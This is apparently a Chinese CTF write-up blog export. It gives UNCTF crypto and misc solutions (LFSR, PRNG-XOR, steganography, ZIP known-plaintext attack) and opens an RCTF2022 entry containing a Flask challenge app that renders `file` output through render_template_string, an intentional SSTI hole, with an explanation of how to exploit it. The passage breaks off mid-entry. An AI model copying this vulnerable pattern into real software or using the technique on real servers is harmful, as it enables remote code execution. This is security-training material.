<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">name = <span class="string">&#x27;unctf&#x27;</span></span><br><span class="line">plaintext_2 = <span class="string">b&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br><span class="line">key1 = <span class="string">b&#x27;Today_is_Thursday_V_me_50&#x27;</span></span><br><span class="line">key1_num = bytes_to_long(key1)</span><br><span class="line"><span class="built_in">print</span>(key1_num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_2</span>(<span class="params">message, num</span>):</span><br><span class="line">    random.seed(num)</span><br><span class="line">    res_2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        temp_num = random.randint(<span class="number">1</span>, <span class="number">128</span>)</span><br><span class="line">        res_2 += long_to_bytes(temp_num ^ i)</span><br><span class="line">    <span class="keyword">return</span> res_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plaintext_1 = decrypt_2(plaintext_2, key1_num)</span><br><span class="line"><span class="built_in">print</span>(plaintext_1)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_1</span>(<span class="params">message, name</span>):</span><br><span class="line">    res = message</span><br><span class="line">    guess = [i <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(name, <span class="number">5</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        what = guess.pop(<span class="number">50</span>)</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span>.join(j <span class="keyword">for</span> j <span class="keyword">in</span> what)</span><br><span class="line">        mask = strxor(<span class="number">5</span> * name.encode(), key1)</span><br><span class="line">        res = strxor(mask, message)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = decrypt_1(plaintext_1, name)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># unctf&#123;1_l0ve_Thurs4Ay!!!&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="EZcry"><a href="#EZcry" class="headerlink" title="EZcry"></a>EZcry</h3><p>提示流密码，密钥长度为16进制16位，猜测为<code>RC4</code>，一把梭：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054358.png" alt=""></p>
<h3 id="easy-lfsr"><a href="#easy-lfsr" class="headerlink" title="easy_lfsr"></a>easy_lfsr</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr</span>(<span class="params">R, mask</span>):</span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; lengthmask</span><br><span class="line">    i = (R &amp; mask) &amp; lengthmask</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i &gt;&gt;= <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line">length = <span class="number">512</span></span><br><span class="line">lengthmask = <span class="number">2</span> ** length - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;**********************&#125;&#x27;</span></span><br><span class="line">pad = os.urandom((length - <span class="built_in">len</span>(flag) * <span class="number">8</span>) // <span class="number">8</span>)</span><br><span class="line">mask = bytes_to_long(flag + pad)</span><br><span class="line"></span><br><span class="line">R = random.getrandbits(length)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;r1 = <span class="subst">&#123;R&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    R,out = lfsr(R,mask)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;r2 = <span class="subst">&#123;R&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># r1 = 1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446</span></span><br><span class="line"><span class="comment"># r2 = 1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757</span></span><br></pre></td></tr></table></figure>
<p>经典的线性反馈移位寄存器，这里相当于给了我们512个状态，而mask刚好有512位，即我们可以列出512个异或方程，联立方程组利用guass消元法即可求解。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r1 = <span class="number">1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446</span></span><br><span class="line">r2 = <span class="number">1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757</span></span><br><span class="line"><span class="comment"># r1和r2不足512位需要补齐</span></span><br><span class="line">a = <span class="string">&#x27;000&#x27;</span> + <span class="built_in">bin</span>(r1)[<span class="number">2</span>:]</span><br><span class="line">b = <span class="string">&#x27;000&#x27;</span> + <span class="built_in">bin</span>(r2)[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># 得到1024位的生成序列</span></span><br><span class="line">d = a + b</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line"><span class="comment"># x为异或方程组</span></span><br><span class="line">x = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, i + <span class="number">513</span>):</span><br><span class="line">        c.append(<span class="built_in">int</span>(d[j]))</span><br><span class="line">    x.append(c)</span><br><span class="line">n = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guass</span>():</span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        t = r</span><br><span class="line">        <span class="comment"># 首先找到当前列中的1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r, n):</span><br><span class="line">            <span class="keyword">if</span> x[i][c] == <span class="number">1</span>:</span><br><span class="line">                t = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 如果都为0就continue</span></span><br><span class="line">        <span class="keyword">if</span> x[t][c] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 交换</span></span><br><span class="line">        x[r], x[t] = x[t], x[r]</span><br><span class="line">        <span class="comment"># 将这一列为1的与第r行异或</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r + <span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">if</span> x[i][c] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c, n + <span class="number">1</span>):</span><br><span class="line">                    x[i][j] ^= x[r][j]</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> r &lt; n:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r, n):</span><br><span class="line">            <span class="keyword">if</span> x[i][n] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>  <span class="comment"># 无解</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>  <span class="comment"># 无穷解</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            <span class="keyword">if</span> x[j][i] == <span class="number">1</span>:</span><br><span class="line">                x[j][n] ^= x[i][n]</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = guass()</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> ret == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No solution&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> ret == <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Multiple sets of solutions&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        res += <span class="built_in">str</span>(x[i][n])</span><br><span class="line">res = <span class="built_in">int</span>(res, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(res))</span><br><span class="line"><span class="comment"># UNCTF&#123;09de44be-5b3d-11ed-b764-ac1203ab14d7&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>Misc做题真是折磨，好多题都出了一半，太难受了（</p>
<h3 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h3><p>记事本打开：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054067.png" alt=""></p>
<p>发现PK头，改后缀为zip。</p>
<p>得到一个xml文件的文件夹，在<code>document.xml</code>中发现异常，提取信息进行零宽解密：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054010.png" alt=""></p>
<h3 id="社什么社"><a href="#社什么社" class="headerlink" title="社什么社"></a>社什么社</h3><p>社工题，打开一个全是<code>#</code>和<code>_</code>的txt文件，可以写个脚本转化一下，更容易看出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">182</span></span><br><span class="line">y = <span class="number">400</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">im = Image.new(<span class="string">&quot;1&quot;</span>, (x, y))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">    line = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">        <span class="keyword">if</span> line[j] == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            im.putpixel((i, j), <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            im.putpixel((i, j), <span class="number">255</span>)</span><br><span class="line">im.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053874.png" alt=""></p>
<p>结合出题人在湖南，猜凤凰古城，md5一下即可。</p>
<h3 id="找得到我吗"><a href="#找得到我吗" class="headerlink" title="找得到我吗"></a>找得到我吗</h3><p>跟第一题一样，改为zip后得到xml文件，在<code>document.xml</code>中寻找到flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053819.png" alt=""></p>
<h3 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h3><p>压缩包中一个syslog文件和另一个加密了的压缩包，显然需要在syslog中寻找密码：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053931.png" alt=""></p>
<p>解码后得到password为<code>U6nu2_i3_b3St</code></p>
<p>打开压缩包得到flag：<code>unctf&#123;N1_sH3_D0n9_L0g_dE!&#125;</code></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053685.png" alt=""></p>
<h3 id="巨鱼"><a href="#巨鱼" class="headerlink" title="巨鱼"></a>巨鱼</h3><p>给了一张png，binwalk分析发现存在隐藏文件：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053957.png" alt=""></p>
<p>得到了一个加密的zip文件，继续分析png图片发现宽高异常，修改宽高：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053199.png" alt=""></p>
<p>得到密码<code>无所谓我会出手</code>:</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053857.png" alt=""></p>
<p>解压zip后得到一个txt和一个加密的zip，丢进010看看，zip伪加密：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053254.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053809.png" alt=""></p>
<p>修改后解压缩得到一个带密码的pptx和一个png，png为：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053988.png" alt=""></p>
<p>六氯环己烷，盲猜密码<code>666</code>，解开pptx，在最后一页发现flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053864.png" alt=""></p>
<h3 id="In-the-Morse-Garden"><a href="#In-the-Morse-Garden" class="headerlink" title="In_the_Morse_Garden"></a>In_the_Morse_Garden</h3><p>pdf文件中ctrl+A发现有隐藏内容：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035403.png" alt=""></p>
<p>得到一串base64编码，解码：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035322.png" alt=""></p>
<p>结合题目想到摩斯码，转换一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">a = f.readlines()[<span class="number">0</span>].replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">63</span>):</span><br><span class="line">    j = a[i * <span class="number">4</span>: (i + <span class="number">1</span>) * <span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">&#x27;玛卡巴卡&#x27;</span>:</span><br><span class="line">        res += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += <span class="string">&#x27;.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>解码得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNCTF&#123;WAN_AN_MAKA_BAKAAAAA!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="zhiyin"><a href="#zhiyin" class="headerlink" title="zhiyin"></a>zhiyin</h3><p>得到一个带密码的zip和一张jpg和一张png，png隐藏了一串摩斯码：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035996.png" alt=""></p>
<p>解码得到<code>_unc7f!!!</code>，这里需要注意<strong>摩斯码不区分大小写</strong>！</p>
<p>jpg丢进010发现被倒置了，写个脚本恢复下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件，并进行十六进制反转</span></span><br><span class="line">res_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/lenovo/Desktop/zhiyin/lanqiu.jpg&#x27;</span>, <span class="string">&#x27;rb+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file_data = file.read()</span><br><span class="line">    hex_data = binascii.b2a_hex(file_data)</span><br><span class="line">    reverse_data = hex_data[::-<span class="number">1</span>]</span><br><span class="line">reverse_data = <span class="built_in">list</span>(<span class="built_in">str</span>(reverse_data)[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(reverse_data), <span class="number">2</span>):</span><br><span class="line">    tmp = reverse_data[i]</span><br><span class="line">    reverse_data[i] = reverse_data[i + <span class="number">1</span>]</span><br><span class="line">    reverse_data[i + <span class="number">1</span>] = tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reverse_data:</span><br><span class="line">    res_data += i</span><br><span class="line">res_data = <span class="built_in">bytes</span>(res_data.encode())</span><br><span class="line"><span class="comment"># 转存十六进制文件为</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/lenovo/Desktop/zhiyin/res.jpg&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(binascii.a2b_hex(res_data))</span><br></pre></td></tr></table></figure>
<p>得到另一部分密码：<code>Go_p1ay</code></p>
<p>利用得到的密码解密zip，在这之前需要修复一下zip：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035243.png" alt=""></p>
<p>改为<code>504B0304</code>即可。</p>
<p>得到flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035090.png" alt=""></p>
<h3 id="清和fan"><a href="#清和fan" class="headerlink" title="清和fan"></a>清和fan</h3><p>得到一个加密的zip，提示：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035230.png" alt=""></p>
<p>查询可知密码为<code>836885_2022/05/20</code>，解压压缩包得到png和另一个加密的zip。</p>
<p>分析png：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035061.png" alt=""></p>
<p>得到password，解密zip后得到另一个加密的zip和一个wav文件，听一遍后发现能用robot36识别：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202113397.png" alt=""></p>
<p>得到zip密码<code>V@mpir3</code>，解开后得到一端零宽隐写的文本，解密即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202031407.png" alt=""></p>
<h3 id="剥茧抽丝"><a href="#剥茧抽丝" class="headerlink" title="剥茧抽丝"></a>剥茧抽丝</h3><p>得到一个加密的zip和txt，txt中存在零宽隐写，先解出来，需要利用保存文件的方式解得，后缀名为txt：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202031337.png" alt=""></p>
<p>但这个解不开zip，结合提示，明文攻击，将txt去除零宽后压缩发现和zip中txt文件的CRC一样，可以明文攻击：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202033496.png" alt=""></p>
<p>明文攻击后得到flag.zip用零宽隐写解密得到的字符解密即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202033619.png" alt=""></p>
<h3 id="芝麻开门"><a href="#芝麻开门" class="headerlink" title="芝麻开门"></a>芝麻开门</h3><p>key.txt中发现：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202029718.png" alt=""></p>
<p>解码为<code>key1</code>，猜测为LSB隐写的密码，运行脚本解密即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202028284.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202028293.png" alt=""></p>
<h3 id="MY-PICTURE"><a href="#MY-PICTURE" class="headerlink" title="MY PICTURE"></a>MY PICTURE</h3><p>得到一个picture文件，放到kali里变成了压缩包，得到一个dat文件和一个png。</p>
<p>分析dat文件：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202028021.png" alt=""></p>
<p>异或<code>8E</code>后：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202027965.png" alt=""></p>
<p>得到一个压缩包，里面有个py文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="keyword">as</span> im</span><br><span class="line"></span><br><span class="line">flag = im.<span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">l,h=flag.size</span><br><span class="line">puzzle=im.new(<span class="string">&#x27;RGB&#x27;</span>,(h,l))</span><br><span class="line"><span class="built_in">print</span>(puzzle)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        r,g,b=flag.getpixel((i,j))</span><br><span class="line">        r=r^g</span><br><span class="line">        g=g^b</span><br><span class="line">        b=b^r</span><br><span class="line">        puzzle.putpixel(((i*<span class="number">787</span>+j)//<span class="number">1200</span>,(i*<span class="number">787</span>+j)%<span class="number">1200</span>),(b,g,r))</span><br><span class="line">puzzle.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">flag.close()</span><br><span class="line">puzzle.close()</span><br></pre></td></tr></table></figure>
<p>说明对png进行了混淆，解混淆即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="keyword">as</span> im</span><br><span class="line">flag = im.<span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/Picture/flag.png&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">l, h = flag.size</span><br><span class="line"><span class="built_in">print</span>(l, h)</span><br><span class="line">puzzle = im.new(<span class="string">&#x27;RGB&#x27;</span>, (h, l))</span><br><span class="line"><span class="built_in">print</span>(puzzle)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        r, g, b = flag.getpixel(((i * <span class="number">787</span> + j) // <span class="number">1200</span>, (i * <span class="number">787</span> + j) % <span class="number">1200</span>))</span><br><span class="line">        r0 = r ^ g</span><br><span class="line">        g0 = r0 ^ g</span><br><span class="line">        b0 = r0 ^ b</span><br><span class="line">        puzzle.putpixel((i, j), (r0, g0, b0))</span><br><span class="line">puzzle.save(<span class="string">&#x27;zeroc.png&#x27;</span>)</span><br><span class="line">flag.close()</span><br><span class="line">puzzle.close()</span><br></pre></td></tr></table></figure>
<p>最后得到：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202123976.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF-WP</category>
      </categories>
      <tags>
        <tag>Write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2022</title>
    <url>/CTF-WP/RCTF2022/</url>
    <content><![CDATA[<h1 id="RCTF2022"><a href="#RCTF2022" class="headerlink" title="RCTF2022"></a>RCTF2022</h1><p>烤漆前参加了RCTF2022，题目难度有点不适合我这种小菜，但是跟着学长们做题还是学到了很多东西，值得记录一下。</p>
<meta name="referrer" content="no-referrer"/>

<span id="more"></span>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="filechecker-mini"><a href="#filechecker-mini" class="headerlink" title="filechecker_mini"></a>filechecker_mini</h3><p>题目给了<code>app.py</code>的源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath) <span class="keyword">and</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
<p>基本逻辑就是上传一个文件，后台会对上传的文件执行<code>/bin/file</code>命令，然后将结果使用<code>render_template_string</code>插入模板中回显。</p>
<p>出现了<code>render_template_string</code>就可以想到<code>SSTI</code>，那么我们就需要控制<code>file</code>命令的结果使其包含我们想要的字符串。</p>
<p>可以了解一下file命令实现的基本原理：</p>
<p>首先可以根据<code>magic number</code>来判断文件类型，比如<code>#!/bin/bash</code>就是shell脚本的魔数；</p>
<p>file命令解析是按照<code>magic</code>文件里的规则对各字段进行解析，所以我们只需要寻找一些特殊的文件类型，让我们可以控制file命令的结果即可。</p>
<p>这里给出两种方式：</p>
<ul>
<li><p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212262231897.png" alt=""></p>
<p>回显为：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212262206992.png" alt=""></p>
<p>可以看到输出内容中带有执行<code>SSTI</code>的内容，上传文件得到flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212262207159.png" alt=""></p>
</li>
<li><p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212262232644.png" alt=""></p>
<p>回显为：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212231801910.png" alt=""></p>
<p>上传文件即可得到flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212231802350.png" alt=""></p>
</li>
</ul>
<h3 id="filechecker-plus"><a href="#filechecker-plus" class="headerlink" title="filechecker_plus"></a>filechecker_plus</h3><p><code>app.py</code>:</p>
